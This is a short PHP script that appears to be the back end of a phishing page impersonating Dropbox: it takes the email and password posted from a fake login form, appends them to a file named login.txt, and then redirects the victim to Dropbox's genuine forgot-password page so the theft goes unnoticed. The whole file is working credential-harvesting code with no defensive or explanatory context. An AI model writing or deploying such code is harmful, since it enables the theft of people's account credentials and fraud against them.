<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['login_email'] ?? '';
    $pass = $_POST['logpass'] ?? '';

    $log = "Dropbox Username: $email | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://www.dropbox.com/forgot/');
    exit();
}
?>
